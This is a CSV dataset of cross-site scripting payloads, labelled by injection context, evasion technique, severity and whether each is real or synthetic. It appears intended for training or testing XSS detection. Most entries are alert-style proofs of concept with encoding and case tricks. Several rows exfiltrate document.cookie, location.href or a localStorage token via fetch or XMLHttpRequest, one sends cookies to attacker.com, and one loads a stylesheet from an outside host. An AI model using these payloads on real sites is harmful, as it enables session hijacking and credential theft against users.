payload,context,technique,severity,length,source
%22 ontransitionrun=console.log(%27XSS%27) %22,attribute_escape,synthetic,medium,46,synthetic
"\"" on&#101;nd&#101;d=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))//",attribute_escape,synthetic,low,77,synthetic
"\"" oncontextmenu=\u0061lert(document.domain)//",attribute_escape,synthetic,low,46,synthetic
"<scRipT>wIndOw['alErt'](StrIng.frOmCHarCodE(88,83,83))</sCriPt>",script_injection,synthetic,high,63,synthetic
' ><svG oNvoLumEchAngE=aLerT(dOcuMenT.dOmaIn)>,attribute_escape,synthetic,medium,46,synthetic
<!</textarea <body onload='alert(1)'>,tag_injection,none,medium,37,real
"JavA	sCriPt:ConFirM(STriNg.FroMChArCOde(88,83,83))",js_uri,synthetic,high,50,synthetic
<img[%09]onerror=alert(1) src=a>,tag_injection,url_encoding,medium,32,real
' onfocusout=console.log(location.hash) ',attribute_escape,synthetic,medium,41,synthetic
<anImaTemOtiOn OnwAitIng=alErt(loCatIon.haSh)>,tag_injection,synthetic,medium,46,synthetic
"""%3E%3Cform ongesturestart=console.log('XSS')%3E",tag_injection,synthetic,medium,48,synthetic
"__proto__[""ondragenter""]=fetch(document.domain)",dom_sink,synthetic,high,47,synthetic
<script ~~~>alert(0%0)</script ~~~>,script_injection,none,medium,35,real
"\"" onanimationend=alert(String.fromCharCode(88,83,83))//",attribute_escape,synthetic,high,56,synthetic
\%27 onmouseenter=alert(document.domain)//,attribute_escape,synthetic,medium,42,synthetic
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><h1 id=x style=""position:absolute;"" onanimationcancel=""print()""></h1>",tag_injection,none,low,173,real
"<maRquEe OncLosE=cOnfIrm(StRinG.fRomChaRCoDe(88,83,83)) oNclOse=coNfiRm(StrIng.frOmCHarCodE(88,83,83))>",tag_injection,synthetic,high,103,synthetic
"""%3E%3Cimg src=x ongestureend=alert(1)%3E",attribute_escape,synthetic,medium,41,synthetic
ondr&#97;gst&#97;rt=j&#97;v&#97;script:confirm(1),event_handler,synthetic,medium,49,synthetic
	onwebkittransitionend=alert('XSS'),event_handler,synthetic,medium,35,synthetic
"<style>:target {color:red;}</style><i id=x style=""transition:color 1s"" ontransitionstart=alert(1)></i>",tag_injection,none,medium,102,real
"<noembed onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</noembed>",tag_injection,none,medium,76,real
"%27 ><svg onanimationiteration=alert(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,68,synthetic
%3Cimg	onkeypress=console.log(1)%3E,tag_injection,synthetic,medium,35,synthetic
<script>/x/consol&#101;.log(1)</script>,script_injection,synthetic,low,39,synthetic
<blink src=x onkeypress=prompt(document.domain)>,tag_injection,synthetic,medium,48,synthetic
{{alert %27XSS%27}},template_injection,synthetic,low,19,synthetic
"""`'><script>\xEF\xBF\xBEjavascript:alert(1)</script>",script_injection,none,medium,52,real
<img src=`xx:xx`onerror=alert(1)>,tag_injection,none,medium,33,real
%22><blink onpopstate=console.log(document.domain)>,tag_injection,synthetic,medium,51,synthetic
"\"" onpoint&#101;rr&#97;wupd&#97;t&#101;=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)//",attribute_escape,synthetic,low,79,synthetic
"LocAtiOn.HreF=""JavAscRipT:cOnsOle.loG(dOcuMenT.dOmaIn)""",dom_sink,synthetic,high,55,synthetic
"<embed onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</embed>",tag_injection,none,medium,66,real
"&quot; on&#97;nim&#97;tionit&#101;r&#97;tion=confirm(String.fromCh&#97;rCod&#101;(88,83,83)) x=&quot;",attribute_escape,synthetic,medium,101,synthetic
"<abbr onmouseover=""alert(1)"">AnonKryptiQuz</abbr>",tag_injection,none,medium,49,real
"loc&#97;tion=""j&#97;v&#97;script:f&#101;tch(String.fromCh&#97;rCod&#101;(88,83,83))""",dom_sink,synthetic,low,84,synthetic
OndRop=alErt/***/(DocUmeNt.DomAin),event_handler,synthetic,low,34,synthetic
"<input3 draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</input3>",tag_injection,none,medium,88,real
""" ><svg ondragover=prompt(1)>",attribute_escape,synthetic,medium,29,synthetic
"""%3E%3Cimg src=x onbeforepaste=alert(1)%3E",attribute_escape,synthetic,medium,42,synthetic
`><Img srC=x onPauSe=ConFirM('XSS')>,attribute_escape,synthetic,medium,36,synthetic
\%27 onwebkitfullscreenchange=alert(%27XSS%27)//,attribute_escape,synthetic,medium,48,synthetic
"""><template ondragenter=alert('XSS')>",tag_injection,synthetic,medium,37,synthetic
"s&#101;tTim&#101;out(""&#97;l&#101;rt(loc&#97;lStor&#97;g&#101;.g&#101;tIt&#101;m('tok&#101;n'))"",0)",dom_sink,synthetic,low,99,synthetic
document.body.innerHTML=('<\000\0i\000mg src=xx:x onerror=confirm(1)>'),dom_sink,none,high,71,real
"\"" ondr&#97;gst&#97;rt=consol&#101;.log(docum&#101;nt.dom&#97;in)//",attribute_escape,synthetic,low,67,synthetic
"OnfUllScrEenChaNge=alErt/**/(STriNg.FroMChArCOde(88,83,83))",event_handler,synthetic,high,59,synthetic
<imG oNweBkiTfuLlsCreEncHanGe=AleRt('XSS') onWebKitFulLscReeNchAngE=aLerT('XSS')>,tag_injection,synthetic,medium,81,synthetic
<script	>consol&#101;.log(1)</script>,script_injection,synthetic,low,37,synthetic
{{\u0061lert 1}},template_injection,synthetic,low,16,synthetic
"%3Csource
oninput=alert(location.hash)%3E",tag_injection,synthetic,medium,41,synthetic
<base onpageswap=alert(%27XSS%27)/>,tag_injection,synthetic,medium,35,synthetic
"<<TexTArEa/*%00//%00*/a=""not""/*%00///AutOFocUs////onFoCUS=alert`AnonKryptiQuz` //",tag_injection,comment_injection|url_encoding|case_variation,low,81,real
"<a2 draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</a2>",tag_injection,none,medium,80,real
"eval(""alert(location.hash)"")",dom_sink,synthetic,medium,28,synthetic
"<noframes><img title=""</noframes><img src onerror=alert(1)>""></noframes>",tag_injection,none,medium,72,real
'><img src=x ontr&#97;nsitionst&#97;rt=confirm(docum&#101;nt.dom&#97;in)>,attribute_escape,synthetic,medium,73,synthetic
"location=""javascr	ipt:fetch(1)""",dom_sink,synthetic,high,31,synthetic
${{ProMpt(doCumEnt.doMaiN)}},template_injection,synthetic,medium,28,synthetic
`><Img srC=x onAniMatIonIteRatIon=coNsoLe.Log('XSS')>,attribute_escape,synthetic,medium,53,synthetic
{phP}pRomPt(DocUmeNt.DomAin){/Php},template_injection,synthetic,medium,34,synthetic
<details ontoggle=alert(1) open>AnonKryptiQuz</details>,tag_injection,none,medium,55,real
"'><img src=x oninvalid=prompt(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,61,synthetic
"""%3E%3Cimg src=x onanimationiteration=alert(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,77,synthetic
' %3E%3Csvg ondragenter=confirm('XSS')%3E,attribute_escape,synthetic,medium,41,synthetic
%22><img src=x oninput=confirm(1)>,attribute_escape,synthetic,medium,34,synthetic
"<select
onpointermove=prompt(%27XSS%27)>",tag_injection,synthetic,medium,40,synthetic
#{confirm(document.cookie)},template_injection,synthetic,high,27,synthetic
"<canvas onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</canvas>",tag_injection,none,medium,87,real
<s&#101;t x=y onpoint&#101;rmov&#101;=confirm(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,medium,69,synthetic
%22%3C!--%3E%3CSvg%20OnLoad=confirm?.(/d3rk%F0%9F%98%88/)%3C!--1%22%29%22%3C%21--%3E%3CSvg+OnLoad%3Dconfirm%3f%2e%28%2fd3rk%F0%9F%98%88%2f%29%3C%21--,event_handler,url_encoding,low,149,real
"__proto__[""onvolum&#101;ch&#97;ng&#101;""]=XMLHttpR&#101;qu&#101;st(loc&#97;lStor&#97;g&#101;.g&#101;tIt&#101;m('tok&#101;n'))",dom_sink,synthetic,high,125,synthetic
"document.body.innerHTML=""<img src=x onerror=XMLHttpRequest(document.cookie)>""",dom_sink,synthetic,high,77,synthetic
<<SCRIPT>alert( AnonKryptiQuz );//<</SCRIPT>,script_injection,case_variation,medium,44,real
"<menu draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</menu>",tag_injection,none,medium,85,real
"<dt draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</dt>",tag_injection,none,medium,60,real
' onended=prompt('XSS') ',attribute_escape,synthetic,medium,25,synthetic
"onclose=\u0061lert(String.fromCharCode(88,83,83))",event_handler,synthetic,high,49,synthetic
<vid&#101;o onmozfullscr&#101;&#101;nch&#97;ng&#101;=prompt('XSS')>,tag_injection,synthetic,medium,67,synthetic
<set	onwebkitfullscreenchange=console.log('XSS')>,tag_injection,synthetic,medium,49,synthetic
"' oNenDed=coNfiRm(StrIng.frOmCHarCodE(88,83,83)) '",attribute_escape,synthetic,high,50,synthetic
"<meta content=""&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(/AmoloHT/)"" http-equiv=""refresh""/>",tag_injection,none,medium,96,real
&#x0003c;,generic,html_entity,low,9,real
"""><ObjEct onTouChsTarT=cOnsOle.loG(lOcaTioN.hAsh)>",tag_injection,synthetic,medium,50,synthetic
"""%3E%3Cobject onbeforepaste=confirm(document.domain)%3E",tag_injection,synthetic,medium,55,synthetic
%22 ontouchend=confirm(%27XSS%27) %22,attribute_escape,synthetic,medium,37,synthetic
"__pRotO__[""oNtrAnsItiOneNd""]=XMLHTtpReqUesT(dOcuMenT.dOmaIn)",dom_sink,synthetic,high,60,synthetic
<animatemotion onanimationiteration=console.log('XSS')/>,tag_injection,synthetic,medium,56,synthetic
&quot; onmouseover=console.log(%27XSS%27) x=&quot;,attribute_escape,synthetic,medium,50,synthetic
"setInterval(""prompt('XSS')"",100)",dom_sink,synthetic,high,32,synthetic
<viDeo onDraGstArt=alErt('XSS') oNdrAgsTarT=aLerT('XSS')>,tag_injection,synthetic,medium,57,synthetic
"\' onwaiting=prompt(String.fromCharCode(88,83,83))//",attribute_escape,synthetic,high,52,synthetic
OndRop=coNsoLe.Log(doCumEnt.doMaiN),event_handler,synthetic,medium,35,synthetic
<scRipT>wIndOw['coNfiRm'](lOcaTioN.hAsh)</ScrIpt>,script_injection,synthetic,low,49,synthetic
%27><img src=x onbeforepaste=alert(%27XSS%27)>,attribute_escape,synthetic,medium,46,synthetic
\' OnbEfoRecOpy=prOmpT(lOcaTioN.hAsh)//,attribute_escape,synthetic,medium,39,synthetic
""" on&#101;nd=confirm(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape,synthetic,medium,62,synthetic
"""<svg onload=alert (1)> "" ;",tag_injection,none,low,27,real
%22><img src=x ongestureend=prompt(document.domain)>,attribute_escape,synthetic,medium,52,synthetic
"<div onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</div>",tag_injection,none,medium,61,real
&quot; onauxclick=confirm(location.hash) x=&quot;,attribute_escape,synthetic,medium,49,synthetic
<!--><math oninvalid=confirm(%27XSS%27)>,tag_injection,synthetic,medium,40,synthetic
<titl&#101;/onst&#97;ll&#101;d=&#97;l&#101;rt('XSS')>,tag_injection,synthetic,low,53,synthetic
""" ><svg onb&#101;gin=confirm(loc&#97;tion.h&#97;sh)>",attribute_escape,synthetic,medium,52,synthetic
""" onfocusout=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape,synthetic,low,71,synthetic
"__proto__[""on&#101;nd&#101;d""]=prompt(docum&#101;nt.dom&#97;in)",dom_sink,synthetic,medium,63,synthetic
	onmous&#101;&#101;nt&#101;r=&#97;l&#101;rt(1),event_handler,synthetic,low,46,synthetic
"<tbody onclick=""alert(1)"" style=display:block>AnonKryptiQuz</tbody>",tag_injection,none,medium,67,real
<% alert('XSS') %>,template_injection,synthetic,medium,18,synthetic
""" %3E%3Csvg onbeforecut=console.log(1)%3E",attribute_escape,synthetic,medium,41,synthetic
"`><img src=x onp&#97;us&#101;=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape,synthetic,low,87,synthetic
""" ><svg ontouchst&#97;rt=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape,synthetic,medium,73,synthetic
<x ondrag=alert(1)>drag this!,tag_injection,none,medium,29,real
"""><img src=x oninput=\u0061lert(1)>",attribute_escape,synthetic,low,35,synthetic
<u contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,tag_injection,none,medium,55,real
%22><td onstalled=confirm(%27XSS%27)>,tag_injection,synthetic,medium,37,synthetic
<b onmousewheel=alert(1) style=display:block>requires scrolling,tag_injection,none,medium,63,real
""" %3E%3Csvg onended=console.log(document.domain)%3E",attribute_escape,synthetic,medium,51,synthetic
"<map onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</map>",tag_injection,none,medium,59,real
java	script:prompt(%27XSS%27),js_uri,synthetic,medium,29,synthetic
%3Cmtext onfocusout=confirm(location.hash)%3E,tag_injection,synthetic,medium,45,synthetic
"&lt;LINK REL=\""stylesheet\"" HREF=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;css\""&gt;",generic,html_entity,low,84,real
{{constructor.constructor('&#97;l&#101;rt(docum&#101;nt.dom&#97;in)')()}},template_injection,synthetic,low,73,synthetic
"EleMenT.iNseRtADjaCenTHTML(""beForEenD"",""<iMg Src=x OneRroR=aLerT(dOcuMenT.cOokIe+'&lOc='+lOcaTioN.hRef)>"")",dom_sink,synthetic,high,106,synthetic
"&lt;IMG SRC='vbscript&#058;msgbox(\""AnonKryptiQuz\"")'&gt;",generic,html_entity,low,57,real
"s&#101;tInt&#101;rv&#97;l(""f&#101;tch(docum&#101;nt.cooki&#101;+'&loc='+loc&#97;tion.hr&#101;f)"",100)",dom_sink,synthetic,low,101,synthetic
<spAn X=y onSecUriTypOliCyvIolAtiOn=AleRt(LocAtiOn.HasH)>,tag_injection,synthetic,medium,57,synthetic
<input id=x tabindex=1 onbeforedeactivate=alert(1)></input><input autofocus>,tag_injection,none,medium,76,real
<teMplAte srC=x onEndEd=ProMpt('XSS')>,tag_injection,synthetic,medium,38,synthetic
`%3E%3Cimg src=x ongesturestart=prompt('XSS')%3E,attribute_escape,synthetic,medium,48,synthetic
"<style>:target {transform: rotate(180deg);}</style><multicol id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></multicol>",tag_injection,none,medium,134,real
`><img src=x ong&#101;stur&#101;&#101;nd=&#97;l&#101;rt(1)>,attribute_escape,synthetic,low,59,synthetic
<input id=x tabindex=1 onactivate=alert(1)></input>,tag_injection,none,medium,51,real
`><Img srC=x onTouChsTarT=cOnfIrm('XSS')>,attribute_escape,synthetic,medium,41,synthetic
"__proto__[""ons&#101;l&#101;ct""]=prompt(docum&#101;nt.cooki&#101;+'&loc='+loc&#97;tion.hr&#101;f)",dom_sink,synthetic,medium,96,synthetic
<script>/*/alert(%27XSS%27)</script>,script_injection,synthetic,medium,36,synthetic
"<div	onw&#101;bkitfullscr&#101;&#101;nch&#97;ng&#101;=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,medium,101,synthetic
j&#97;v&#97;script:%0&#97;prompt(1),js_uri,synthetic,medium,35,synthetic
' ontouchst&#97;rt=confirm('XSS') ',attribute_escape,synthetic,medium,35,synthetic
"<footer draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</footer>",tag_injection,none,medium,90,real
<hr onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</hr><input value=clickme>,tag_injection,none,medium,104,real
"`><img src=x onpromptaction=confirm(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,67,synthetic
"ong&#101;stur&#101;&#101;nd=confirm/**/(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler,synthetic,low,79,synthetic
"SetIntErvAl(""feTch(doCumEnt.coOkiE+'&loC='+loCatIon.hrEf)"",100)",dom_sink,synthetic,high,63,synthetic
"Obj&#101;ct.&#97;ssign(window,{""onw&#101;bkit&#97;nim&#97;tion&#101;nd"":prompt})",dom_sink,synthetic,low,80,synthetic
"<article oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</article>",tag_injection,none,medium,66,real
"<style>:target {color:red;}</style><tr id=x style=""transition:color 1s"" ontransitionend=alert(1)></tr>",tag_injection,none,medium,102,real
\%22 ondragenter=prompt(document.domain)//,attribute_escape,synthetic,medium,42,synthetic
"<style>:target {color:red;}</style><table id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></table>",tag_injection,none,medium,114,real
"onselect=javascript:prompt(String.fromCharCode(88,83,83))",event_handler,synthetic,high,57,synthetic
%3C!--%3E%3Ca onmozfullscreenchange=alert(location.hash)%3E,tag_injection,synthetic,medium,59,synthetic
<sp&#97;n	onb&#101;for&#101;toggl&#101;=prompt(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,medium,70,synthetic
<col onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,53,real
<diAloG oNpaGehIde=coNsoLe.Log(1) onPagEhiDe=ConSolE.lOg(1)>,tag_injection,synthetic,medium,60,synthetic
\' onp&#97;g&#101;show=consol&#101;.log('XSS')//,attribute_escape,synthetic,low,48,synthetic
"<embed draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</embed>",tag_injection,none,medium,87,real
"&#101;l&#101;m&#101;nt.s&#101;tAttribut&#101;(""onclick"",""&#101;v&#97;l('//&#97;tt&#97;ck&#101;r.com/?c='+docum&#101;nt.cooki&#101;)"")",dom_sink,synthetic,low,133,synthetic
""" ><svg onfocus=console.log(location.hash)>",attribute_escape,synthetic,medium,43,synthetic
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe,generic,html_entity,low,107,real
%3Ctemplate ondragenter=alert('XSS')%3E,tag_injection,synthetic,medium,39,synthetic
[#prompt document.cookie /],template_injection,synthetic,high,27,synthetic
"__pRotO__[""oNkeYdoWn""]=fEtcH(STriNg.FroMChArCOde(88,83,83))",dom_sink,synthetic,high,59,synthetic
\' OnpAgeShoW=cOnsOle.loG(lOcaTioN.hAsh)//,attribute_escape,synthetic,medium,42,synthetic
"<blockquote oncut=""alert(1)"" contenteditable>AnonKryptiQuz</blockquote>",tag_injection,none,medium,71,real
"<style>@keyframes x{}</style><dd style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></dd>",tag_injection,none,medium,97,real
"<style>:target {color: red;}</style><frameset id=x style=""transition:color 10s"" ontransitioncancel=print()></frameset>",tag_injection,none,low,118,real
"""%3E%3Cimg src=x oncopy=console.log(1)%3E",attribute_escape,synthetic,medium,41,synthetic
"JavA
sCriPt:ProMpt('XSS')",js_uri,synthetic,medium,25,synthetic
<isindex action=javascript:alert(1) type=submit value=click>,js_uri,none,medium,60,real
"eval(""alert(btoa(document.cookie))"")",dom_sink,synthetic,high,36,synthetic
"<ifr&#97;m&#101; ontouchst&#97;rt=prompt(String.fromCh&#97;rCod&#101;(88,83,83))/>",tag_injection,synthetic,medium,82,synthetic
"<div draggable=""true"" contenteditable>drag me</div><hr ondragover=alert(1) contenteditable style=display:block>drop here</hr>",tag_injection,none,medium,125,real
`%3E%3Cimg src=x onreset=console.log('XSS')%3E,attribute_escape,synthetic,medium,46,synthetic
onscroll&#101;nd=prompt(1),event_handler,synthetic,medium,26,synthetic
<html onfocusout=alert(1) tabindex=1 id=x></html><input autofocus>,tag_injection,none,medium,66,real
"<marquee onmouseout=""alert(1)"">AnonKryptiQuz</marquee>",tag_injection,none,medium,54,real
{% &#97;l&#101;rt 'XSS' %},template_injection,synthetic,low,26,synthetic
<IMG SRC=”jav ascript:alert(‘XSS’);”>,generic,case_variation,medium,37,real
 onBefOrePasTe=ConSolE.lOg(DocUmeNt.DomAin),event_handler,synthetic,medium,43,synthetic
"<bdo onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</bdo>",tag_injection,none,medium,67,real
"""`'><script>\xE2\x80\x88javascript:alert(1)</script>",script_injection,none,medium,52,real
&quOt; onProMptActIon=prOmpT(lOcaTioN.hAsh) x=&qUot;,attribute_escape,synthetic,medium,52,synthetic
"<link draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</link>",tag_injection,none,medium,85,real
<audio/onplay=console.log(1)>,tag_injection,synthetic,medium,29,synthetic
<s&#101;t/onc&#97;npl&#97;y=confirm(1)>,tag_injection,synthetic,medium,39,synthetic
"""><img src=x onmozfullscreenchange=alert(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,72,synthetic
"<shadow onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</shadow>",tag_injection,none,medium,88,real
%3Clink onwaiting=confirm(1) onwaiting=confirm(1)%3E,tag_injection,synthetic,medium,52,synthetic
"<multicol onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</multicol>",tag_injection,none,medium,73,real
<&#97;nim&#97;t&#101;motion on&#97;nim&#97;tionc&#97;nc&#101;l=prompt(1)/>,tag_injection,synthetic,medium,74,synthetic
""" ><svg ontouchst&#97;rt=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape,synthetic,low,80,synthetic
<custom tags onpointerover=alert(1) style=display:block>AnonKryptiQuz</custom tags>,tag_injection,none,medium,83,real
<math oninvalid=confirm(%27XSS%27)>,tag_injection,synthetic,medium,35,synthetic
"<s draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</s>",tag_injection,none,medium,60,real
""" ><svg onbegin=console.log(location.hash)>",attribute_escape,synthetic,medium,43,synthetic
onkeydown=javascript:confirm(1),event_handler,synthetic,medium,31,synthetic
onmousedown=console.log/*x*/(%27XSS%27),event_handler,synthetic,low,39,synthetic
 onDraGovEr=ConFirM(lOcaTioN.hAsh),event_handler,synthetic,medium,34,synthetic
&quot; onbeforepaste=\u0061lert('XSS') x=&quot;,attribute_escape,synthetic,low,47,synthetic
"<ifr&#97;m&#101;
ons&#101;curitypolicyviol&#97;tion=confirm('XSS')>",tag_injection,synthetic,medium,67,synthetic
"<tbody draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</tbody>",tag_injection,none,medium,63,real
"&#101;l&#101;m&#101;nt.s&#101;tAttribut&#101;(""onclick"",""consol&#101;.log('XSS')"")",dom_sink,synthetic,low,82,synthetic
"<body onload body onload=""javascript:javascript:alert(8185)""></body onload>",js_uri,none,medium,75,real
<scr	ipt ondblclick=prompt(1)/>,tag_injection,synthetic,medium,31,synthetic
window[%22console.log%22](btoa(document.cookie)),dom_sink,synthetic,high,48,synthetic
"<xmp
ontransitionend=\u0061lert(location.hash)>",tag_injection,synthetic,low,47,synthetic
"<fieldset onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</fieldset>",tag_injection,none,medium,71,real
"<s onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</s>",tag_injection,none,medium,78,real
"""><Img srC=x onDroP=aLerT('XSS')>",attribute_escape,synthetic,medium,33,synthetic
"<img2 oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,97,real
""" ><svg on&#97;nim&#97;tion&#101;nd=confirm(docum&#101;nt.dom&#97;in)>",attribute_escape,synthetic,medium,70,synthetic
<meTa Src=x OnpOinTerOveR=cOnfIrm(1)>,tag_injection,synthetic,medium,37,synthetic
"""><tr ontransitionend=prompt(String.fromCharCode(88,83,83))>",tag_injection,synthetic,high,60,synthetic
&quot; ongesturestart=prompt('XSS') x=&quot;,attribute_escape,synthetic,medium,44,synthetic
"%27 ><svg onwaiting=prompt(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,58,synthetic
"\"" oncut=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))//",attribute_escape,synthetic,low,67,synthetic
"<p draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</p>",tag_injection,none,medium,60,real
%22><blink onmouseup=alert(1)>,tag_injection,synthetic,medium,30,synthetic
"""><img src=x on&#101;rror=consol&#101;.log(loc&#97;tion.h&#97;sh)>",attribute_escape,synthetic,low,66,synthetic
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><noframes id=x style=""position:absolute;"" onanimationcancel=""print()""></noframes>",tag_injection,none,low,185,real
"'><Img srC=x onInvAliD=pRomPt(StrIng.frOmCHarCodE(88,83,83))>",attribute_escape,synthetic,high,61,synthetic
"<summary ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</summary>",tag_injection,none,medium,95,real
""" onmouseenter=\u0061lert(location.hash) """,attribute_escape,synthetic,low,42,synthetic
{{[].pop.constructor(%27prompt(%27XSS%27)%27)()}},template_injection,synthetic,medium,49,synthetic
\' OncLicK=cOnfIrm('XSS')//,attribute_escape,synthetic,medium,27,synthetic
<img/src/onerror=alert&#xFEFF;(1337)>,tag_injection,html_entity,low,37,real
"__proto__[""oninput""]=prompt(docum&#101;nt.cooki&#101;+'&loc='+loc&#97;tion.hr&#101;f)",dom_sink,synthetic,medium,85,synthetic
' oNenD=pRomPt(LocAtiOn.HasH) ',attribute_escape,synthetic,medium,31,synthetic
"EvaL(""ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83))"")",dom_sink,synthetic,high,50,synthetic
"<em onmousedown=""alert(1)"">AnonKryptiQuz</em>",tag_injection,none,medium,45,real
"\"" OneNdeD=aLerT('XSS')//",attribute_escape,synthetic,medium,25,synthetic
onmousedown=javascript:console.log('XSS'),event_handler,synthetic,medium,41,synthetic
	ondr&#97;gov&#101;r=confirm(loc&#97;tion.h&#97;sh),event_handler,synthetic,medium,51,synthetic
<scRipT>wIndOw['coNsoLe.Log'](DocUmeNt.DomAin)</ScrIpt>,script_injection,synthetic,low,55,synthetic
<img src='1' onerror='alert(1)',tag_injection,none,medium,31,real
"""><form onformdata=window.confirm(document.cookie)><!--",dom_sink,none,high,55,real
<&#97;udio onpopst&#97;t&#101;=confirm(loc&#97;tion.h&#97;sh) onpopst&#97;t&#101;=confirm(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,medium,113,synthetic
"onbegin=javascript:confirm(String.fromCharCode(88,83,83))",event_handler,synthetic,high,57,synthetic
"<figure onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</figure>",tag_injection,none,medium,67,real
 onfocusout=confirm('XSS'),event_handler,synthetic,medium,26,synthetic
"<b onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</b>",tag_injection,none,medium,55,real
<title onmozfullscreenchange=prompt(%27XSS%27) onmozfullscreenchange=prompt(%27XSS%27)>,tag_injection,synthetic,medium,87,synthetic
"Obj&#101;ct.&#97;ssign(window,{""ontr&#97;nsitionrun"":confirm})",dom_sink,synthetic,low,62,synthetic
OnpOinTerRawUpdAte=jaVasCriPt:ConSolE.lOg(1),event_handler,synthetic,medium,44,synthetic
'><img src=x ondragstart=console.log(location.hash)>,attribute_escape,synthetic,medium,52,synthetic
"""aaa&#x3C;a href=javas&#x26;#99;ript:alert(1)&#x3E;click""",attribute_escape,html_entity,medium,57,real
"<div onclick=""alert(1)"">AnonKryptiQuz</div>",tag_injection,none,medium,43,real
"<strong draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</strong>",tag_injection,none,medium,88,real
"oncut=prompt&#40;String.fromCharCode(88,83,83)&#41;",event_handler,synthetic,high,51,synthetic
{{ ConFirM(dOcuMenT.dOmaIn) }},template_injection,synthetic,medium,30,synthetic
